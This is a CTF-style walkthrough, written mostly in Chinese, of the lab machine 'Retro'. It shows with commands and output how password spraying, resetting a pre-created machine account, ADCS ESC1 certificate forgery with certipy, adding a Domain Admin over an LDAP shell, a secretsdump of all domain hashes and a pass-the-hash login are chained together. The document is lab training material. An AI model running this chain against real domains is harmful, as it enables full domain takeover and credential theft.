## Retro

```
certipy auth -pfx administrator.pfx
KDC_ERR_PADATA_TYPE_NOSUPP //不支持你用这种证书方式走 Kerberos;
原因：域控配置不支持 PKINIT（证书 Kerberos 登录）
```
```
CN = DC.retro.vl
↓
确认这是域控
↓
默认尝试：
  - LDAP / LDAPS
  - Kerberos
  - ADCS
↓
certipy find
```
#### 弱密码 / 预创建计算机账户 → 重置机器账户密码 → ADCS ESC1 → 伪造管理员证书 → LDAP Shell → 新建域管 → dump 全域 hash
```
倒推：
1 NetExec（nxc）：nxc = crackmapexec 的现代重写版：登录验证/枚举/shares / users / modules；验证 Guest 空密码是否能 SMB 登录
2 (READ)表示非默认共享
3 Important.txt 的信息价值：“bundle every one of you up into one account”多学员一个共享密码
4 Impacket = AD 攻击工具底层库：通过 SAMR RPC 接口，修改 AD 中某个账户的密码；rpc-samr 是Windows 远程账户管理协议
5 nxc ldap -M adcs 的意义：用于 确认 certipy 结论的真实性
6 ESC1 —— Retro 的致命点：任意机器账户可以申请证书
7 banking$ + SID → 伪造管理员证书
8 Kerberos 铁规则KRB_AP_ERR_SKEW 
sudo ntpdate retro.vl
9 certipy + pfx → LDAP Shell → 创建域管用户
certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44 -ldap-shell
【administrator.pfx = 可用于 Kerberos / LDAP 的身份凭据】
LDAP Shell：
add_user
change_password
add_user_to_group Domain Admins
10【在域控上，用管理员权限直接改了 AD 数据库】
secretsdump.py retro.vl/pwned:'P@ssw0rd123!'@10.129.234.44 -just-dc
【AD dump 手法：-just-dc 是关键：ntds.dit；krbtgt；所有用户 NTLM hash】
```
```
【Retro 攻击模型】

初始入口
└─ 预创建计算机账户（BANKING$）
   └─ 弱初始密码 / 可 RPC 修改

横向能力
└─ ADCS 枚举
   └─ ESC1（机器账户可伪造身份）

权限提升
└─ 伪造 Administrator 证书
   └─ LDAP Shell
      └─ 新建域管

后渗透
└─ secretsdump
└─ 全域 hash
```

```
[★]$ nmap -sC -sV 10.129.234.44
Nmap scan report for 10.129.234.44
Host is up (0.0090s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-29 08:19:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-29T08:20:32+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-29T08:20:32+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-29T08:20:32+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-29T08:20:32+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-29T08:19:52+00:00
|_ssl-date: 2025-12-29T08:20:32+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2025-12-28T08:01:08
|_Not valid after:  2026-06-29T08:01:08
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-29T08:19:53
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

```
#### 加入域名 完全限定域名FQDN
```
[★]$ echo "10.129.234.44 retro.vl dc.retro.vl" | sudo tee -a /etc/hosts
```
#### 使用Netexec
```
[★]$ nxc smb retro.vl "Guest" -p ""
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating default workspace
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Initializing VNC protocol database
[*] Initializing WMI protocol database
[*] Initializing FTP protocol database
[*] Initializing RDP protocol database
[*] Copying default configuration file
SMB         10.129.234.44   445    DC
[*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```
#### 2个 non-default shares（非默认共享） called Notes and Trainees
```
[★]$ nxc smb retro.vl -u "Guest" -p "" --shares
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.44   445    DC               [+] retro.vl\Guest: 
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON                        Logon server share
SMB         10.129.234.44   445    DC               Notes                       
SMB         10.129.234.44   445    DC               SYSVOL                          Logon server share
SMB         10.129.234.44   445    DC               Trainees        READ
```
#### 使用smbclient连接到共享
```
[★]$ smbclient //retro.vl/Trainees -U 'Guest'
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 23 16:58:43 2023
  ..                                DHS        0  Wed Jun 11 09:17:10 2025
  Important.txt                       A      288  Sun Jul 23 17:00:13 2023

		4659711 blocks of size 4096. 1326771 blocks available
smb: \> get Important.txt
getting file \Important.txt of size 288 as Important.txt (7.8 KiloBytes/sec) (average 7.8 KiloBytes/sec)
smb: \> exit
```
#### 本地查看
```
[★]$ cat Important.txt
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```
#### 我知道你们中的一些人似乎很难记住强大而独特的密码。
#### 所以我们决定把你们每个人都集中到一个账户里。
#### 别再烦我们了。请。除了每天重置密码，我们还有其他事情要做。

#### 如备注所述，学员账户的密码是所有学员共享的，可能是弱，以便用户可以记住它。使用来宾身份验证，应该枚举域中用户和组的rids
```
[★]$ nxc smb retro.vl -u "Guest" -p "" --rid-brute
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.44   445    DC               [+] retro.vl\Guest: 
SMB         10.129.234.44   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.129.234.44   445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.129.234.44   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.129.234.44   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         10.129.234.44   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         10.129.234.44   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         10.129.234.44   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.44   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.44   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.129.234.44   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.44   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.129.234.44   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.129.234.44   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.129.234.44   445    DC               1109: RETRO\tblack (SidTypeUser)
```
#### 在默认对象中，需要注意5个非默认帐户。银行业似乎是一台机器由于在结尾处有一个$字符。
#### 正如Important.txt中提到的，这些帐户可能使用了弱密码。这个最后，让我们检查这些帐户中是否有使用用户名作为密码的。
```
[★]$ nxc smb retro.vl -u "Guest" -p "" --rid-brute > rid.txt
[★]$ grep -oP 'RETRO\\\K[^ ]+(?=\s+\(SidTypeUser\))' rid.txt > users.txt
[★]$ cat users.txt
Administrator
Guest
krbtgt
DC$
trainee
BANKING$
jburley
tblack
```
#### \K：丢弃前面的内容   [^ ]+ 重新开始   \s+ 空格

```
[★]$ nxc smb retro.vl -u users.txt -p users.txt --continue-on-success
<SNIP>
SMB         10.129.50.94    445    DC               [+] retro.vl\trainee:trainee
<SNIP>
```
#### 找到学员帐户的弱密码。密码确实与用户名相同。使用标识凭据后，可以枚举Notes共享
```
[★]$ smbclient //retro.vl/Notes -U 'trainee%trainee'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr  8 22:12:49 2025
  ..                                DHS        0  Wed Jun 11 09:17:10 2025
  ToDo.txt                            A      248  Sun Jul 23 17:05:56 2023
  user.txt                            A       32  Tue Apr  8 22:13:01 2025

		4659711 blocks of size 4096. 1308083 blocks available
smb: \> get ToDo.txt
getting file \ToDo.txt of size 248 as ToDo.txt (5.8 KiloBytes/sec) (average 5.8 KiloBytes/sec)
smb: \> get user.txt
getting file \user.txt of size 32 as user.txt (0.7 KiloBytes/sec) (average 3.2 KiloBytes/sec)
smb: \> exit
[★]$ cat user.txt
```
### Privilege Escalation
```
[★]$ cat ToDo.txt
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.
在说服财务部门去掉他们的旧银行软件之后
现在终于到了收拾烂摊子的时候了。我们应该从预先创建的开始
计算机帐户。那个比我还大。

Best

James
詹姆斯
```
#### 正如ToDo.txt所提到的，来自财务部门的旧的预先创建的机器帐户是我们从RID暴力破解中找到的BANKING$帐户。在创建计算机帐户时，如果将此计算机帐户分配为windows 2000以前的计算机则将密码设置为帐户名称本身，但使用小写字母。如果机器帐户没有尚未对域进行身份验证，可以更改其密码。让我们首先验证banking是否确实是banking $机器帐户的密码
```
[★]$ smbclient //retro.vl/Notes -U 'BANKING$%banking'
session setup failed: NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```
#### 因为我们得到NT状态NOLOGON工作站信任帐户，而不是NT状态登录失败机器账户，看起来是这样的。现在，应该更改密码以成功进行身份验证。对于这个更改，passpasswd.py from可以使用Impacket。
```
[★]$ ls /usr/share/doc/python3-impacket/examples/changepasswd.py
/usr/share/doc/python3-impacket/examples/changepasswd.py
[★]$ cp /usr/share/doc/python3-impacket/examples/changepasswd.py .

[★]$ pip install impacket


[★]$ python3  changepasswd.py retro.vl/'banking$':banking@10.129.234.44 -newpass 'qwerty1!' -p rpc-samr
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of retro.vl\banking$
[*] Connecting to DCE/RPC as retro.vl\banking$
[*] Password was changed successfully.

[★]$ crackmapexec smb retro.vl -u 'bankings$' -p 'qwerty1!'
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating default workspace
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Initializing VNC protocol database
[*] Initializing WMI protocol database
[*] Initializing FTP protocol database
[*] Initializing RDP protocol database
[*] Copying default configuration file
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.44   445    DC               [+] retro.vl\bankings$:qwerty1!
```
#### 有了banking$ machine帐户的凭据，应该进行进一步的枚举。让我们检查一下活动目录证书服务的存在。
```
[★]$ nxc ldap retro.vl -u "banking$" -p 'qwerty1!' -M adcs
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
LDAP        10.129.234.44   389    DC               [+] retro.vl\banking$:qwerty1!
ADCS        10.129.234.44   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.234.44   389    DC               Found PKI Enrollment Server: DC.retro.vl
ADCS        10.129.234.44   389    DC               Found CN: retro-DC-CA
```
#### 在本例中，安装了ADCS，证书颁发机构标识为retrodc - ca。证书应该是用于进一步枚举证书服务。
```
[★]$ which certipy-ad
[★]$ which certipy
/usr/local/bin/certipy

[★]$ certipy find -u 'banking$' -p 'qwerty1!' -dc-ip 10.129.234.44 -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)
<SNIP>
    CA Name                             : retro-DC-CA
   </SNIP>
  <SNIP>
    Template Name                       : RetroClients
    </SNIP>
    Minimum RSA Key Length              : 4096
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      <SNIP>
    [!] Vulnerabilities
      ESC1                              : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
</SNIP>
```
#### 从证书输出中，我们看到复古dc - ca证书颁发机构容易受到ESC1攻击，这允许攻击者为另一个用户请求证书并使用该证书进行身份验证域。在注册权限中，我们看到BANKING$所在的域计算机组的成员被允许注册到模板中。证书输出的CA名称、模板名称和最小RSA密钥长度应为指出。使用这些，应该从RetroClients模板请求一个新的证书，进行模拟Administrator用户。
```
[★]$ rpcclient -U 'retrovl\banking$%qwerty1!' 10.129.234.44
rpcclient $> lookupnames Administrator
Administrator S-1-5-21-2983547755-698260136-4283918172-500 (User: 1)
rpcclient $>exit
```
```
[★]$ python3 -m venv certipy-env
[★]$ source certipy-env/bin/activate

(venv)[★]$ certipy req -u 'banking$' -p 'qwerty1!' -dc-ip 10.129.234.44 -ca retro-DC-CA -template RetroClients -upn Administrator -debug -target dc.retro.vl -key-size 4096 -sid S-1-5-21-2983547755-698260136-4283918172-500 -timeout 60
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'dc.retro.vl' at '10.129.234.44'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 11
[*] Got certificate with UPN 'Administrator'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saved certificate and private key to 'administrator.pfx'


[★]$ sudo su
[root]#certipy req -u 'BANKING$@retro.vl' -p 'qwerty1!' -ca retro-DC-CA -template RetroClients -upn Administrator@retro.vl -debug -target dc.retro.vl -sid S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096 -timeout 60
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'dc.retro.vl' at '10.129.234.44'
[+] Trying to resolve 'RETRO.VL' at '10.129.234.44'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 12
[*] Got certificate with UPN 'Administrator@retro.vl'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saved certificate and private key to 'administrator.pfx'

certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44

```
#### 然后，应该使用该证书对域控制器进行身份验证，并检索的RC4哈希值管理员用户
```
//lookupsid.py retro.vl/BANKING$:qwerty1!@dc.retro.vl
```

#### 注意：如果出现KRB AP ERR SKEW等错误，请使用sudo ntpudate retro.Vl来同步你的时间域控制器
#### Kerberos 的铁规则：客户端与域控时间差不能超过 5 分钟
```
[★]$ sudo ntpdate retro.vl
2026-01-01 02:15:20.579974 (-0600) -0.083656 +/- 0.004694 retro.vl 10.129.234.44 s1 no-leap
```
#### 这是为了防止：重放攻击 离线票据滥用


#### 已经以 Domain Admin（Administrator）身份，成功 LDAP 认证到 DC
#### 这不是 Linux shell，也不是 Windows cmd / PowerShell，这是 Certipy 的 LDAP 交互式 Shell
```
[★]$ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.vl' -dc-ip 10.129.234.44 -ldap-shell
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Connecting to 'ldaps://10.129.234.44:636'
[*] Authenticated to '10.129.234.44' as: u:RETRO\Administrator
Type help for list of commands

# whoami
u:RETRO\Administrator
# exit 

[★]$ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.vl' -dc-ip 10.129.234.44 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@retro.vl
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)

certipy auth -pfx administartor.pfx -dc-ip 10.129.234.44

```
#### 要的这种输出（NT hash），只能在 certipy auth 的“非 ldap-shell 模式”下得到
#### 这个域控不支持“用证书换 Kerberos TGT”（PKINIT）
```
[★]$ certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44 -ldap-shell
# add_user pwned
Attempting to create user in: %s CN=Users,DC=retro,DC=vl
Adding new user with username: pwned and password: Nstg;eu3ck?99E< result: OK

# add_user pwned "CN=Users,DC=retro,DC=vl"
Attempting to create user in: %s CN=Users,DC=retro,DC=vl
LDAPEntryAlreadyExistsResult - 68 - entryAlreadyExists - None - 00000524: UpdErr: DSID-031A11FA, problem 6005 (ENTRY_EXISTS), data 0
 - addResponse - None

# change_password pwned P@ssw0rd123!
Got User DN: CN=pwned,CN=Users,DC=retro,DC=vl
Attempting to set new password of: P@ssw0rd123!
Password changed successfully!

# add_user_to_group pwned "Domain Admins"
Adding user: pwned to group Domain Admins result: OK

# get_user_groups pwned
CN=Administrators,CN=Builtin,DC=retro,DC=vl
CN=Domain Admins,CN=Users,DC=retro,DC=vl
CN=Denied RODC Password Replication Group,CN=Users,DC=retro,DC=vl

#exit
```

```
[★]$ secretsdump.py retro.vl/pwned:'P@ssw0rd123!'@10.129.234.44 -just-dc
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389:::
<SNIP>
```
#### 用新用户 dump 全域 hash
```
[★]$ evil-winrm -u Administrator -H 252fac7066d93dd009d4fd2cd0368389 -i retro.vl
                                        
Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
retro\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/8/2025   8:11 PM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
```
